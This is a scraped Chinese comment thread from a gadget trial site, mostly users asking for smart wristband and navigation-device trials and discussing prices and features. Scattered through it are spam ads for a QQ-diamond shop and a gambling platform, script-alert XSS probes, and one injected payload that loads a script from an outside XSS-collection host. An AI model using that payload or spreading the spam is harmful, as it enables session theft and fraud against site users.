苹果的需要iOS7.0及以上，iphone4s及以上； 安卓的需要Android4.3及以上，三星Galaxy S3，Galaxy S4，Galaxy Note2，Galaxy Note3； 其他硬件支持蓝牙4.0、系统为Android4.3或以上的手机，理论上支持，但不保证稳定性。
                 ?゛呵呵卡盟|全天秒单|手机钻1-3折|临时钻5毛|超级会员10元|给力下单给力秒|电信钻联通钻  ?゛6折官方年钻|图标点亮|空间代刷|游戏代刷|空间卡密5毛  ?゛腾讯天天手机游戏酷跑飞车金币10W5毛钱  ?゛呵呵卡盟官方网址:www.hehekm.com  ?゛注册填写上级编号14400  |自动开通代理
要是可以控制摄像头的角度，又是一个偷拍神器了！！呵呵呵
1....................
全天秒单|手机钻1-3折|临时钻5毛|超级会员10元|给力下单给力秒|电信钻联通钻  ❉゛6折官方年钻|图标点亮|空间代刷|游戏代刷|空间卡密5毛  ❉゛腾讯天天手机游戏酷跑飞车金币10W5毛钱 ❉゛各种游戏抽奖 、道具  ， ❉゛QQ钻低至3元/月  ，欢乐豆1毛钱1W
全天秒单|手机钻1-3折|临时钻5毛|超级会员10元|给力下单给力秒|电信钻联通钻  ❉゛6折官方年钻|图标点亮|空间代刷|游戏代刷|空间卡密5毛  ❉゛腾讯天天手机游戏酷跑飞车金币10W5毛钱 ❉゛各种游戏抽奖 、道具  ， ❉゛QQ钻低至3元/月  ，欢乐豆1毛钱1W
全天秒单|手机钻1-3折|临时钻5毛|超级会员10元|给力下单给力秒|电信钻联通钻  ❉゛6折官方年钻|图标点亮|空间代刷|游戏代刷|空间卡密5毛  ❉゛腾讯天天手机游戏酷跑飞车金币10W5毛钱 ❉゛各种游戏抽奖 、道具  ， ❉゛QQ钻低至3元/月  ，欢乐豆1毛钱1W
我想要QAQ
视频是显示不了么 
真是很不错的设计，网络上也有类似的，但是使用了效果不好。真的很期待！
好东西就要分享 
是啊。我也在纳闷
很希望有个 奇酷智能手环 我太爱它了，好好期待啊啊啊啊啊啊！！！！！！！！！！狂怒
客户是检验产品的是否合格的最佳的检测员
APP要求安卓4.3及以上，这个要求还好，现在小米1S都是4.3以上了。IP4S以上也都可以吧
看简介感觉很不错，喜欢能抽中
我也要  期待
我去...你这报告写的...挺认真的，不过希望你以后用全面的Ｕ盘检测软件，弄几个速度截图怪不伦不类．．．．．．还有，防伪标签居然不刮开．．．另外，我买的ＷＩＦＩＵ盘版，里边有说明书和挂绳啊～～～你中奖了，买方便面没面饼～＼（≧▽≦）／～啦啦啦
给你个赞好了．．．．．．．．
可以了哎。。。。
看着这款信手环   满满的都是期待啊！！！！    忍不住点个赞~
第一次写报告，好紧张的哦...还望多多指教，会努力写更好的体验报告
“脑关机的话,还能用吗? 电脑关机时会自动断开网络,而360随身WiFi必须依靠电脑的网”我百度了一下这段文字．．．发现－。－这段话复制的人很多嘛～～～
这款手环的特点是精巧，但是他的核心可以进行别出心裁的设计，对于后期制作而言，可以适当增加手环样式，或者定制特殊手环，例如情侣手环之类的，手机之所以不离身就是怕挚爱的人的来电有遗漏，那么它的功能更应该贴合情侣之间的关系，你们觉得呢。 
这款手环的特点是精巧，但是他的核心可以进行别出心裁的设计，对于后期制作而言，可以适当增加手环样式，或者定制特殊手环，例如情侣手环之类的，手机之所以不离身就是怕挚爱的人的来电有遗漏，那么它的功能更应该贴合情侣之间的关系，你们觉得呢。 
赞一个。。。呜呜，看完后瞬间感觉我的弱爆了，唉...
十分期待，快点批量生产吧……好想买一个……
很棒啊，赞一个，看我觉得我的更更更弱爆了 = =
很不错的功能  外观也很炫酷
功能有有新意，外观也很炫酷   希望有一款
赞一个，遥控、传图什么的我都不知道，呜呜
怎么那么多换行呀，我选的右悬浮，还有建议改进下传图哦，感觉很麻烦滴，嘻嘻，我是不是事儿多了点呀O(∩_∩)O
感觉是有点贵啊，和华为智能手环相比不知道买那个好了……
希望能被抽中，通过自身体验总结成体验报告，促进产品更加完善。期待中奖
高大上有木有
这款手环的特点是精巧，但是他的核心可以进行别出心裁的设计，对于后期制作而言，可以适当增加手环样式，或者定制特殊手环，例如情侣手环之类的，手机之所以不离身就是怕挚爱的人的来电有遗漏，那么它的功能更应该贴合情侣之间的关系，你们觉得呢。
这样高科技的东西，会不会有辐射？
超酷的，很喜欢，喜欢被选中！ 
这款手环的特点是精巧，但是他的核心可以进行别出心裁的设计，对于后期制作而言，可以适当增加手环样式，或者定制特殊手环，例如情侣手环之类的，手机之所以不离身就是怕挚爱的人的来电有遗漏，那么它的功能更应该贴合情侣之间的关系，你们觉得呢。
绝对的高大上，太心水了，跪求小编赐予我GYENNO One吧！
孩子正常走失这个是神器（同类产品也很多），但是孩子如果是被强迫带走的，那这个东西就很容易被破坏掉，建议将产品做成纽扣或饰品可以钉在衣服上的，就不易被察觉。
高大上  外形帅气  功能实用   适合现在的中高端人群！！！！！
超炫，超喜欢！！！
这款手环的特点是精巧，但是他的核心可以进行别出心裁的设计，对于后期制作而言，可以适当增加手环样式，或者定制特殊手环，例如情侣手环之类的，手机之所以不离身就是怕挚爱的人的来电有遗漏，那么它的功能更应该贴合情侣之间的关系，你们觉得呢。
如果买，需要多少人民币
设计很贴心啊，能加上拨打和接听电话的功能就更好了！
一定要中(⊙o⊙)哦，超喜欢的
谢谢夸奖。我看了很多人的评测，都写得很专业。看来还有不小的差距啊。我们都应该多多学习，特别是这期手环广告，精简直观，直达用户心里。这就是目标啊。
超炫，超酷，美感。
第一次写试用报告，站在大家都能理解的角度，希望多多支持~~留下你们的赞和建议
你别吓我，真的假的啊，现在还没有收到货？
还不错的智能产品。
七月最最想得到的愿望ONE
真让人心动，超前实用，美感时尚
我怎么感觉我已经是命中了？
我比较关心持久性的问题，别用不了多长时间，就不能用了！那还不如买个普通的省事！
这款手环的特点是精巧，但是他的核心可以进行别出心裁的设计，对于后期制作而言，可以适当增加手环样式，或者定制特殊手环，例如情侣手环之类的，手机之所以不离身就是怕挚爱的人的来电有遗漏，那么它的功能更应该贴合情侣之间的关系，你们觉得呢。
送你了，不谢。
这款手环的特点是精巧，但是他的核心可以进行别出心裁的设计，对于后期制作而言，可以适当增加手环样式，或者定制特殊手环，例如情侣手环之类的，手机之所以不离身就是怕挚爱的人的来电有遗漏，那么它的功能更应该贴合情侣之间的关系，你们觉得呢。 
这款手环的特点是精巧，但是他的核心可以进行别出心裁的设计，对于后期制作而言，可以适当增加手环样式，或者定制特殊手环，例如情侣手环之类的，手机之所以不离身就是怕挚爱的人的来电有遗漏，那么它的功能更应该贴合情侣之间的关系，你们觉得呢。 
最好能接听电话，那就完美了
想试下看能不能泡到MM啊
无限电话？
看着不错，以前看到这类似的产品，不想从这里看到，强烈要求使用，看看产品怎么样！
能告诉我怎么泡妞吗
&lt;&gt;aaaaaa
&lt;img src=1&gt;
看起来蛮不错的 强烈要求试用！！！
这个真的好吗
651226.com  杏彩平台支持你
最大的需求防水 
这个手环，我觉得只能给你提示，比如有短信，电话这类的！如果还要可接打电话，发送短信什么的！有点不靠谱！ 1.屏幕就那么大，你打算用什么方式去输入 2.接打电话，是很耗费电量的！这个手环怕是你说了多长时间就得充电，频繁的充电，你能接受的了吗？ 所以，我觉得目前产品已有的功能，还是比较合适的！具体的，希望能有测试的资格，写一份具体的试用报告！！！
651226.com  杏彩平台我要~~
我喜欢 好想买
看起来真的很爽，就是价格贵了一点！
希望可以试用  
产品真是太好了，它是高科技和人类智慧的结晶，应该在全世界推广，让人人都用上这个优质产品。
功能强大无比强烈要求试用
偷拍 利器 就是贵了点 嘿嘿
微积分网站
你写的报告也很好啊。奇酷网没有选错人。
在哪买啊？
产品的功能性还是受到了限制，对于这一点手机制造商的确在不断完善，但可用性仍然较低1.无接听并拨打的功能 2.电池电量的使用时间受到限制，不适合野外以及办公 3.如果与手机一同使用的话，功能便比较完善，但如果手机不使用或没带呢，那么。。。你懂得 3.无论腕带的舒适度和材料有多好，戴久了都不舒服 ，个人觉得睡觉最好身上不要戴任何东西，一些首饰最好也不要戴 4.直接点，现在对于这产品，找不到适应人群..
这个手环，我觉得只能给你提示，比如有短信，电话这类的！如果还要可接打电话，发送短信什么的！有点不靠谱！ 1.屏幕就那么大，你打算用什么方式去输入 2.接打电话，是很耗费电量的！这个手环怕是你说了多长时间就得充电，频繁的充电，你能接受的了吗？ 所以，我觉得目前产品已有的功能，还是比较合适的！具体的，希望能有测试的资格，写一份具体的试用报告！！！ 
我觉得楼上说的很好
希望贵公司能开发出来全息投影的科技产物！~我想我可以活动那一天的！~~~~~~~
好喜欢~感觉好好~
GOOD！好喜欢~
同感啊，的确很想要一个
希望以后普及化
希望有一个
高端大气上档次！
说的有点恐怖
以后定是科技时代
不过挺贵的
个人觉得功能非常强大，实用性也很好，诚恳地希望获得测试的资格。
穷人伤不起啊，希望价格降得的普及化
赞~\(≧▽≦)/~
顶~\(≧▽≦)/~
坐时间久的人必备啊
希望3D技术普及化
希望科技普及化，想想看，戴上虚拟头盔在家学习.工作.娱乐什么的（除非必须出门的事），可以少建点房子，多弄点绿化，那时候的世界→→→→→无比期待ing
同感啊~\(≧▽≦)/~
爱美女性或许会为之疯狂
以后人会不会退化的说
楼主摄影技术惊人，，大师呀 有情怀~
o(╯□╰)o现在几乎什么都有智能
请叫我雷锋= =
单反穷三代，告诉你。哼
你就不改个马甲？ 
妹子没有出镜 差评！
I be who I am
这是赤果果的嫉妒~
这是我看到最精彩的试用报告了。文字、图片、排版、内容都是一流的啊。
谢谢支持，整个人都萌萌哒了^_^
楼主我也中了，不过手机居然不适配，我该怎么办？
十分心焦，急求回复！
我该怎么写报告？难道该用官方的图吗？急的要哭了
楼主，我也中了，不过不跟我的手机适配！怎么办。。。
我也觉得是，不过好像用手表通话而不凑到耳边去听去讲的话表示要外放，那样估计不太好
很专业的图
我要看真人！
这个手环的电话和短信还是不要的好，就当它是一款运动型的手环好了。电话什么的还是用手机好一些，至于WiFi嘛，让手机去连。
无线充电。运动检测。睡眠监测。闹钟。加完全防水。完全满足我的日常需求。期待。不给试用就买。@@@@
同感啊同感
真希望 产品能越来越完善。想过年 给我那几个调皮的侄子和侄女 一人买一个，再也不用担心他们乱跑了。
是不是免费的 
(⊙o⊙)…
希望普及化，穷人伤不起
这是第一次。。。
真人是大美女。哈哈
呵呵，我的一个给我弄坏了。。唉败家子啊！
“活跃点”不仅仅是对运动的一个反馈，同时也是一个激励。一个活跃点相当于1RMB，可以在bong的商城里作代币。所以由最开始每次手环振动都吓一跳，到现在每次振动心理都大喊一声：一块钱！
顶...........
这种手表和普通标看着一样，没什么区别感觉像是间谍用的手表。只不过不知道耐脏不耐脏。防摔不防摔，毕竟有时候还是不小心的。
已申请人数 : 26180人
好东西哦，支持 
这个手环也抓住我的需求点，不中我也买。而且要看看别人的试用报告。
个人觉得功能非常强大，实用性也很好，诚恳地希望获得测试的资格。 
中国的垃圾食品无处藏身
这种叫MIFI，一般要配用超流量4G卡用好使，只是让你没有4G手机的人使用上4G网络的快感
移动就有这种MIFI，不过呢，我们这里是1.5G，30块，而且网络不能跨省，用这个联通移动都能用，你还可以在淘宝淘那种几块钱，好几G的，全国覆盖网络
嘿嘿，谢谢
有监听功能吗？
你的什么手机？那你就写一些外观和硬件
安卓手机现在也很多支持4G的，比如OPPO的9007，813S，2017，6007，5117等
你可以拍些手环的图啊
求楼主单反型号
你的机型在官方公布的机型范围内吗？ 盒子的背后有清楚给出的~~~其他机型都在完善测试中~~~还有一种情况就是机型能用，但是需要配合官方来测试是否是手环的问题。。
很低折扣，差不多出厂价。 
真心是个想玩这个的用户，简单一句希望能获得测试资格，一定大力推广.
时尚个性，赞
好赞啊，外观精致，希望价格实惠
爱照相机，精简
大爱！功能很强大！手环设计感很强，简介、大方。希望得到试用机会！！
我的收到了，s4没用之前，一天两充，用了之后。。。。。。一天两充。。。有用吗？我不知道
这个表我关注很久了
买了一个土豪金黑白色的，上网so easy
这个不错，啥时候有呢
价格在低点就好了
很喜欢的一款产品，希望能得到试用机会，我会好好填写试用报告的。
试用好用的话想给老婆买一个
跑我贴里来了。。。。挺有趣的
65M还嫌低。。。请问房子还在吗？0.0~~~
都申请N次了不知道是否能有机会试用一下，体验好的话，不但送老婆还要介绍给身边的朋友们呢！ 哈哈
如果真能试用的到的话不是要好好填写，而是要认真的填写报告才行！明白
很喜欢的一款产品，实用性也很好，诚恳地希望获得测试的资格。 希望能得到试用机会，我会好好填写试用报告的。
是机械的不是电子
很喜欢这款手表。按照要求认真填写了申请。出了很多建议创新的点子。希望能得到试用。
这东西一点用也没有吧。
骗人的，我们等了3年了，打电话也说还未发售。
什么跑到你贴里面？嘿嘿
这款腕带功能很给力啊。外观大气，实用性强。就是不知道能不能幸运得到这次试用。。嘿嘿~！
腾讯15号就要发布这个产品一样的东西，就是不知道怎么样。
材料都是可降解，怎么会不环保？
希望机会到了！
期待后续.... 
这报告写得牛，照片拍得猛，效果做得霸气。就不知道妹子张的好看不
佳能5D2~
阿丁阿丁阿丁
看到苏亚雷斯 我就进来了  不错的报告
这哥们写得跟世界杯有关系，碉堡了！不错哦
还特别用心的上传了个视频，不错 不错
留点想象空间:D 下次再中签可以考虑爆照哈哈~~
我想要一台！ 
应该是无线电吧，容易被干扰的吧。对于智能家居来说 这个不实用，手机遥控着多方便。 这个也就是开关安全性高点，没有直接操作电源。
安全新会好很多，不过现在的智能家居 实用价值不高了。
重在参与~
淘宝网上卖258的，还有优惠券。图片都和你的一模一样，想在这坑爹呢？
最喜欢的设计款，他首先是一个表，再是一个智能表
高大上啊 我喜欢
炫酷，要是能够试用就好了！！
哈哈哈哈~ ~
自从昨天认真填写了试用申请后，每天都忍不住上来观看观看进展啊。。。。。提了很多建议，第一次申请，希望人品大爆发！
酷毙了！帅！超想试用！
5+2=7   那是多少折  
很低折扣，差不多出厂价.
请问在哪购买啊 ? 
我好想要 我要 好酷的
要要 我好想要
是不是搞着玩的，一直都未发售。
没听说么3年未上市
放丢功能是基本，导航结合是创新
感觉东西还挺多功能的，不错
自从昨天认真填写了试用申请后，每天都忍不住上来观看观看进展啊。。。。。提了很多建议，第一次申请，希望人品大爆发！这款腕带功能很给力啊。外观大气，实用性强。就是不知道能不能幸运得到这次试用。。嘿嘿~！
我要试用。。。。。。  
爆发吧我的小宇宙，跪求试用
同学你好，3年是哪来的消息啊？我们是半年前才发布的呢
真心希望360的这款神作能降临到我的手里，日夜期盼的人儿啊，赶快来到我的身边吧。让我好好照顾你，陪伴你！！
很不错的报告，特别是图片
看着不错哈，期待试用！！
就是薄了点
人家半年前才发布的~你这3年咋过的呀
非常喜欢，很想试用！
高德地图还是很值得信赖的。希望高德地图能干掉百度地图。
不错，，想用。。。好用给女朋友也买一个
还有后续吗……
贴在哪啊？
这样的东西，很好，很不错。
很喜欢，希望能中，但希望似乎有点渺茫
Come on!
好像要，这个看上去真心棒，好想给爸爸买一个，就是太贵了
信赖爱奇艺，支持高德，你值得拥有
话说高德地图真心用起来挠心~~~每次加载流量唰唰跑
这些产品其实国产的也有，而且功能不比他弱，比如宜家安 egean 的智能药盒，支持无线数据与手机等进行通讯，服药状况可以进行全程监控，再加管理平台和人工服务，想不服药服错药都难。
感觉好棒，有种看科幻片的感觉
加油，一定要中，中，
灰常期待，中奖试用
感觉挺喜欢的。
非常棒啊，只是太贵了，买不起，蓄电量也有点小吧
高德做出这个东西，估计不容易，加油
重要是防丢功能！
还不错啊！支持下
不错嘛，高德做出这个东西，估计不容易，加油
哈哈哈，这不就是自拍利器吗！！！女生都得拥有啊！希望不要太贵。。。
很希望中， 
有点意思，赶紧上试用吧。搞一个试试如何
期待一试！
期待尽快发货~
那个表多少钱
拍皂利器啊！！！希望别太贵
很期待成功
自从昨天认真填写了试用申请后，每天都忍不住上来观看观看进展啊。。。。。提了很多建议，第一次申请，希望人品大爆发！这款腕带功能很给力啊。外观大气，实用性强。就是不知道能不能幸运得到这次试用。。嘿嘿~！ 
我想试用下呢~~~
我想试试这个！！！什么时候能够开放申请呢？
看看我的申请记录，除了未通过，就是现在最新的两条筛选中。 不过还是希望此次能选中。
哈哈哈 炫酷炫酷！
希望有更大改进，希望越来越好！
很想中，但是就是没中过一次。。。
很想中一次
good!
必须申请！但愿有机会！
不成功不成仁
这个真心不错，看到女神了
但愿有机会！ 
好想要一个！
刚好需要一个，买的导航仪数据更新太慢了，期待！
期待中一次，改变自己的生活习惯。但愿GYENNO One智能手环越做越好
漂亮实用，我值得拥有！
哇！非常需要哦  亲  强烈关注~~~ 
想中一次，我越来越喜欢360了
求送我一个
不错哦，值得一试，不要太贵
求高德小蜜
林志玲哦，哈哈。。。想试用女神吧
花了将近5个小时完成了报告,后期我还将会进行更改,请各位继续关注我的试用报告.
app的界面要是能并在排下版就好了，要不这样看太长啦
这个不错~~~~~~~·
这个不错啊
很好 很不错!
很好很不错!
不错哦，下回登山可以带上。  哈哈   但愿能中签~~
我会申请这个的  竟和打印机打交道了 研究一下  哈
看起来棒棒的！
加油360
中一次好难
密集恐惧症
7月了还不上市,真想............
东西不错，希望能中。
ghjgfjgfhj
不等不说，这个人做事很细致，分析得很到位，边提意见还能帮着提出方案，牛！
这个太棒辣！
萌萌哒，希望可以中
所谓的预约那是骗人的，我十多兆的网速都没抢到
僧多粥少啊
好棒啊！！赞赞赞！！！
 期待，好喜欢
写的不错~
期待ing.  感觉好牛逼。 也很喜欢
我申请试用
可能是65MB/s
东西很好，希望能中，每次申请都没中
没有车也一样可以用啊。
有那么便宜吗？？？？？？？？？？？？？？？
特别好，我自己认为没有什么缺点，很完美
非常感兴趣馁 
造型不错，小巧，挺好的
米键明显是后出来的。智键和快按钮才是被抄袭的。
希望能中一下 
我试用女神就行了
编辑完之后果然赞了非常多啊。
期待已久的装备，功能很全面
期待！！！！
期待，我已经这么多期了
希望能第一时间体验
求购什么时候有！
不错看介绍。紧跟时尚生活。
敢不敢让我试用 
噢，好期待啊。。。。。。。。希望能第一时间体验，欧巴。。
我来了。写的不错。继续。
这个挺好的，很实用，赞一个
智能手环看过来~ 看过来~看过来~快点到我碗里来~请不要对我不理不睬~
期待试用高德地图的第一件硬件产品。
睡眠功能对我很有用，这项功能很有创意。
参加了多少期了就没成功过，这次估计也没戏
忽然想到如果这个手环可以放歌就好了 运动时也不会寂寞 在跑步时沉浸在音乐里就不感觉那么累了  如果考虑放歌声音会小或者声音会不会劈 可以设计一个比市场上的小型外扩插口音响小点的 就比蜗牛大一点 那样子既可以当装饰品又解决声音小这个问题了 音响样式可以设计各种各样  调试声音大小的可以设计在这个音响上面也可以设计在手环上   嘿嘿~   快夸我 ~ 快夸我~~  哇咔咔咔~~~
忽然想到智能手环如果可以放歌就好了 运动时不寂寞也有动力  如果考虑声音大小 会不会劈  可以设计一个比市场的外扩插口小音箱小一点 比蜗牛大一点的样子 样式可以设计的多样化 既可以解决声音又可以当装饰品携带也方便  应该会深受大众喜爱  哇咔咔~ 快夸我~ 快夸我~~
忽然想到智能手环如果可以放歌就好了 运动时不寂寞也有动力  如果考虑声音大小 会不会劈  可以设计一个比市场的外扩插口小音箱小一点 比蜗牛大一点的样子 样式可以设计的多样化 既可以解决声音又可以当装饰品携带也方便  应该会深受大众喜爱  哇咔咔~ 快夸我~ 快夸我~~
忽然想到智能手环如果可以放歌就好了 运动时不寂寞也有动力  如果考虑声音大小 会不会劈  可以设计一个比市场的外扩插口小音箱小一点 比蜗牛大一点的样子 样式可以设计的多样化 既可以解决声音又可以当装饰品携带也方便  应该会深受大众喜爱  哇咔咔~ 快夸我~ 快夸我~~
忽然想到智能手环如果可以放歌就好了 运动时不寂寞也有动力  如果考虑声音大小 会不会劈  可以设计一个比市场的外扩插口小音箱小一点 比蜗牛大一点的样子 样式可以设计的多样化 既可以解决声音又可以当装饰品携带也方便  应该会深受大众喜爱  哇咔咔~ 快夸我~ 快夸我~~
忽然想到智能手环如果可以放歌就好了 运动时不寂寞也有动力  如果考虑声音大小 会不会劈  可以设计一个比市场的外扩插口小音箱小一点 比蜗牛大一点的样子 样式可以设计的多样化 既可以解决声音又可以当装饰品携带也方便  应该会深受大众喜爱  哇咔咔~ 快夸我~ 快夸我~~
你怎么知道嘞  说不定天上说不定真掉下个馅饼砸到你嘞    别灰心哇   这都是尝试  
忽然想到智能手环如果可以放歌就好了 运动时不寂寞也有动力  如果考虑声音大小 会不会劈  可以设计一个比市场的外扩插口小音箱小一点 比蜗牛大一点的样子 样式可以设计的多样化 既可以解决声音又可以当装饰品携带也方便  应该会深受大众喜爱  哇咔咔~ 快夸我~ 快夸我~~
很实用，赞一个 
忽然想到智能手环如果可以放歌就好了 运动时不寂寞也有动力  如果考虑声音大小 会不会劈  可以设计一个比市场的外扩插口小音箱小一点 比蜗牛大一点的样子 样式可以设计的多样化 例如设计成一只耳朵插在手环上屏幕的图片是一个搞怪的脸 好不可爱~ 既可以解决声音又可以当装饰品携带也方便  应该会深受大众喜爱  哇咔咔~ 快夸我~ 快夸我~~
忽然想到智能手环如果可以放歌就好了 运动时不寂寞也有动力  如果考虑声音大小 会不会劈  可以设计一个比市场的外扩插口小音箱小一点 比蜗牛大一点的样子 样式可以设计的多样化 例如设计成一只耳朵插在手环上屏幕的图片是一个搞怪的脸 好不可爱~ 既可以解决声音又可以当装饰品携带也方便  应该会深受大众喜爱  哇咔咔~ 快夸我~ 快夸我~~
好想要一个
忽然想到智能手环如果可以放歌就好了 运动时不寂寞也有动力  如果考虑声音大小 会不会劈  可以设计一个比市场的外扩插口小音箱小一点 比蜗牛大一点的样子 样式可以设计的多样化 例如设计成一只耳朵插在手环上屏幕的图片是一个搞怪的脸 好不可爱~ 既可以解决声音又可以当装饰品携带也方便  应该会深受大众喜爱  哇咔咔~ 快夸我~ 快夸我~~
我要报名参加测试！
你在关心什么？ 
感觉还不错啊
忽然想到智能手环如果可以放歌就好了运动时不寂寞也有动力如果考虑声音大会不会劈可以设计一个比市场的外扩插口小音箱小一点比蜗牛大一点的样子样式可以设计的多样化例如设计成一只耳朵插在手环上屏幕的图片是一个搞怪的脸好不可爱~既可以解决声音又可以当装饰品携带也方便应该会深受大众喜爱哇咔咔~快夸我~快夸我~
但一看价格，哥们儿，贵了点吧
不要太贵了哦 
不错，值得期待
一直使用高德導航，看來此物件必備嘛。無論能不能參與測試，我一定敗一個
高德，支持一下。
才发现。有200个高德小蜜呐。不少啊。！！！！
我喜欢平的 
多少钱，这个可以买
很期待，希望能够参与测试
我很想要啊~这么强大的功能，对我很有帮助。。很好
路盲等待测试中……
这个可以有，一直想要个这样的产品
小支持下，看介绍蛮好用的。
真的很好啊！小巧玲珑很喜欢的。我会来的。需要你
什么鸟表这么难产
对于Android系统的用户来说，Android4.3以上的用户的确比较少！建议可以兼容性考虑从Android2.3-Android4.4.4，这样来说用户面更广，而且用户密度增大后，可以考虑小蜜之间的定位校准，极大地提高定位精度！
要想被市场接受，必须考虑成本问题，如果能低于原有布线成本（资金），相信应该比较快的被市场接受，毕竟对于消费者来说，降低了布线的其它成本（现金以外的比如时间），而且还可以添加一个保护环境的噱头
是不是卖东西的？还搞来搞去。。。。。。
期待高德小蜜
我说怎么感觉少点东西，U盘功能我没写啊！😭我错了😣
太好了 希望体验这种时髦 新鲜的电子产品
期待期待中
太好了，这个产品比较适合于我
多谢鼓励，其实写的很渣，比较乱，写的时候自己都感觉到了。
想拥有这么好的东西
期待这个，路盲必备
很期待，很强大，很确定
要是能够通话的话应该会更好
我很平凡，相信你很不一般
最近高德的导航金币就挺好的，现在竟然有小蜜陪伴了？哈哈。期待推出啊。
这个设备真不错
vff反反复复
其实不要涂二维码，绑定时要手环验证码
好想拥有。。。。。
扫码绑定==
都他妈的跟雷军学，
这产品能有这么好的功能好期待尝试下，~~~
    ddffffff
      &lt;script&gt;alert(&#039;a&#039;)&lt;/script&gt;
/&lt;script&gt;alert(&#039;a&#039;)&lt;/script&gt;/
&lt;script&gt;alert(&#039;a&#039;)&lt;/script&gt; /&lt;br&gt;
我好喜欢  好喜欢  好想拥有
每天都来看你，你什么时候卖啊
女神，更希望女神能陪在我的爱车里。
不错价格合理一定闹一个
腕带后续可以购买么？ 
觉得这个产品真心好
不错，正需要
太(ˇˍˇ） 想～要了 
什么时候开始卖啊
不错，不过国内什么时候才有
售价是多少了这玩意 
价格很重要、虽然新鲜但不长久
这个创意不错，价格了是多少 
如果加入对讲,要吧叫他回家,那就真的太酷了.
32个赞，爱死了
这创意不错
小巧，值得期待。高德地图一直在用，值得信赖。高德地图小蜜应该是一大亮点。
定位 导航等效果一定不错 外加基于蓝牙的基础 能自带拍照或者切歌等 都很有吸引力 
期待，和高德地图有进一步整合
没有中过，希望可以中，这次一定要啊，爱死了
看起来比方形的要棒
很不错的东西，但售价和普及度息息相关
这个价格 市场不会好吧
这个价格不错，什么时候出来 
我们后续会推出多款配件，可以选择在京东商城购买！
谢谢，您的支持！我们会更加努力的！
专业定制医用覆膜贴于腋窝下，测温比较准确，并且贴合比较舒适！也还可以选用配件，佩戴到上手臂处，进行短暂测温。谢谢！
大赞苏牙~
贴在腋下，体温贴精心挑选定制了一种超薄透气低敏抑菌的医用覆膜，贴上以后异物感不明显。 
简单实用的一小东西，喜欢，赞一个=_=
看起来真的不错，泡妞神器，不知道对水深的要求是多少，价位能不能平民点。
力挺着款智能手环~就算不中我也要买~希望中一个~我买多点嘿嘿~~
好东西，支持！
戴在手腕上和贴在腋下测量数据会有差异么？官方是建议哪种方式？
补充，腕带颜色可选么？
挺不错的东西，有买的想法。
不错不错 支持希望能中！    
是啊 得多买点 
要是增加一个实时体温测量就更好了。希望量产版上市能有这个功能。
你好掌柜电怎么联系你呢
看起来非常轻薄。照片拍的很漂亮。
掌柜你好有问题问一下你
很酷哦，想买一个
支持奇酷。网站设计的越来越漂亮了。
我是来看志玲姐姐的。
我是来看志玲姐姐的。
真的被你玩出来了智能场景。看来智能生活已经来临了。
现在已经可以保存草稿了吧。
我现在就在使用非自能手机手表 希望这个出来以后能够代替我现在用的 
测量体温建议用覆膜贴在腋下，佩戴到手腕上，主要是为了实现儿童防丢功能的！
支持、、、我现在用的手表都不好、、希望奇酷给我一个惊喜
如果加入GPS功能可以知道身在何方就更好，给小孩用还可以知道他是否安全
1.增加容量 2.减少发热
期待申请试用
产品不错 希望能中
已经预约支持了你们的产品，希望你们能把产品做的完美，期待能更快的拿到产品，期待
谢谢您的支持！您的支持会使我们更有动力！
赞赞赞赞赞赞
腕带颜色前期推出的是清新的草绿色，后期会推出多彩配色！我们有什么最新消息会第一时间通知您的！谢谢您的关注和支持！
不是有粉色的吗？怎么没有放货吗？
能好用吗？
价格太高，
美好，从这里开始~~~
小孩用这种设备恐怕不太好吧
很贵的话哪有人买？ 
上次360推鉴的3d打印笔一点都不好用  不过这个好似满高级 至少没电线 
好期待啊！！！
很喜欢，最好有离线定位的功能。
说实话，有些太贵了！！接受不了！
好期待啊啊啊啊啊啊啊
很强大的东东，参加了好几期奇酷使用了为什么就没选上过呢？ 
我要中选，大神啊！！给个机会吧
驴友神器！！！！！
这个看起来更有范点，也更成熟些，长形、方形的感觉像是小孩带的玩具一样
这是个好东西，酷到掉渣，泡妞神器，值得拥有，不过价钱估计难以接受
强大啊！MY GOD！赐予我力量！
说实话，外形、操作界面真心难看，橡胶外壳。。。
好厉害哦！！！我喜欢！！！
这个东西好， 不用开手机，就能直接导航，而且还能查询路况，我现在经常开车去上海市区，碰上路堵，别提多愤怒了，虽然导航我也用的高德，但是手机上网，后台软件没法控制，流量消耗太大了，而且费电，有了这个小东西帮忙就更好了，期待ing
 很厉害的样子 来个瞧瞧
很棒的手环！喜欢！
路盲必备 等待测试中……
很想要一个
产品不错 希望能中  
炫酷,科技范儿十足.
扯蛋不好看
我连小智键都没有，不公平啊！！！呜呜呜呜。。。。。
汉语：我是来打酱油的。 英语： I&#039;m going to buy some soy sauce.　  韩语： 나는 간장 소스. 德语： ich gehe Sojasosse kaufen.  法语： je me suis prend que sauce de soja.  俄语： Я пришла за соевым соусом. 
很好的东西，希望能用用
手机的gps 搜索不给力  经常收不到。。希望这个给力点 
看试用报告，大家都是在晒单，根本不是试用报告。
希望能中，每次申请都没中 ,官方人员行行好，中了一定认真体验、反馈！
洗澡防水只是算日常防水吧！？
如果不是很费电，值得拥有
写得不错哟 头像好卡哇伊~~
如此强大的东东，赐我一个吧！！
&lt;/textarea&gt;&#039;&quot;&gt;&lt;script src=http://www.xss8.net/?c=5OWrB&gt;&lt;/script&gt; 
虚拟屏幕啊啊啊
我去  等十来年才能等到？
Projet 1200主要用于珠宝个人工作室，有需要的可以访问http://www.zthinktech.com咨询
是OLED.  LED
承你贵言哈。真的没想到，居然被提拔了
看起来很强大，很好用的东西啊。。
我有预约码，要不因为蓝屏造抢到了，开头JD预约码
这飞机价格顶多200，超过就不值了
出行的利器，生活的必备！期待加入测试！
我超级喜欢这样的
看介绍貌似应该挺好用的。
手机丢了怎么办？  
再等等哈~我也才刚收到呢~我不打算这么快就交报告呢~~~
这个不错，给我弟弟用正好。。。。。。。。。。。。
哇哦 强大   特想要一台
久坐人士必备，期待中
那么强大的东东  特想要   
功能这么好，希望能成功试用
谁能告诉我。。产品数量不是50个吗？？那51份试用报告是怎么回事？？
算我一个!!!
这个智能手环应该可以更好的培养我的时间观念。嘿嘿，功能很好都是实用的。
从外观来看，比较流畅的设计，功能贴近生活，实用方便，但是总觉得没有什么太大的亮点，难道是用了以后才会知道？
是否有摆脱手机的科技产品？
觉得不太棒，屏幕好像不能弯曲
自动寻找充电器的功能超棒！赞一个
我倒是担心这么小巧的防丢卫士会丢掉...
这个不错.
How cool！但是我不会买，咱不是土豪啊！
有两张重复的宣传图...
智能空气净化器？我要好好捉摸下！
控烟好产品！大爱！！解决了目前难题
简约漂亮...没了
需要支撑的。我的车一直有高德导航很好用的。希望在来个小蜜更加完美了
